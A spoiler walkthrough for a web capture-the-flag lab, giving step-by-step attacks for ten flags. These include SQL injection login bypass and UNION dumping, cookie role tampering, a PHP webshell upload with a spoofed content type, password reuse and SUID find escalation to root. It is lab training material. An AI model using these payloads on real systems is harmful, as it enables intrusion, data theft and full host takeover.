# Writeup — Reading Room (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. View-source `/` → HTML comment.
2. Log in at `/staff/login.php` with `librarian` / `librarian123` →
   dashboard shows flag 2 (role=staff view).
3. After logging in, edit the `role` cookie from `staff` to `admin`
   (browser dev tools, or Burp) and reload `/staff/dashboard.php` → flag 3.
4. `gobuster dir -u http://TARGET/ -w <wordlist>` finds `/backup/` →
   `catalog_backup.sql.txt` has flag 4 in a comment.
5. At `/staff/login.php`, submit username `' OR '1'='1' -- ` with any
   password. The raw SQL query becomes always-true and returns the first
   row (the real `admin` row, id=1) — session is now server-side
   authenticated as `admin`. Visit `/staff/panel.php` → flag 5.
6. At `/catalog/search.php?q=x`, add a single quote to break the query,
   confirm 2 columns with `' ORDER BY 2 -- ` / `' ORDER BY 3 -- ` (the
   second succeeds, the third errors), then:
   `?q=zzz' UNION SELECT note, passphrase FROM staff_notes -- -`
   → flag 6, and a passphrase (`InkAndIvy22`) for step 8. (`sqlmap -u
   "http://TARGET/catalog/search.php?q=x" -p q --dump` gets the same
   result automatically.)
7. At `/catalog/upload.php`, upload a one-line PHP webshell
   (`<?php system($_GET['c']); ?>`) named `shell.php`, but force the
   multipart part's `Content-Type` to `image/jpeg` (Burp's "Change
   request method"/repeater, or `curl -F
   "cover=@shell.php;filename=shell.php;type=image/jpeg"`). The app only
   checks that claimed type, not the real extension or content. Then:
   `curl "http://TARGET/uploads/shell.php?c=cat+/opt/flag7.txt"` → flag 7.
8. Download `/images/ledgers_of_dust.jpg`, then
   `steghide extract -sf ledgers_of_dust.jpg -p InkAndIvy22 -xf out.txt`
   → flag 8 (the other two cover images have nothing hidden in them).
9. Through the webshell: `cat /etc/passwd` shows a real account `mcurie`.
   Her password is the same as the web app's default creds:
   `echo librarian123 | su mcurie -c 'cat /home/mcurie/flag9.txt'` → flag 9.
10. Through the webshell: `find / -perm -4000 -type f 2>/dev/null` shows
    `/usr/bin/find` itself is SUID root. GTFOBins' `find` sudo/SUID entry:
    `find /root/flag10.txt -exec cat {} \;` (or `find . -exec /bin/sh -p
    \; -quit` for an interactive root shell) → flag 10.

## Honeypots encountered (intentional, cost time only)
- `/backup/old_passwords.txt.bak` — explicitly inert decoy credentials.
- `/backup/not_a_flag.txt` — explicitly tells you it isn't one of the ten.
- `images/quiet_archivist.jpg`, `images/ferrymans_toll.jpg` — real images,
  nothing hidden in either.
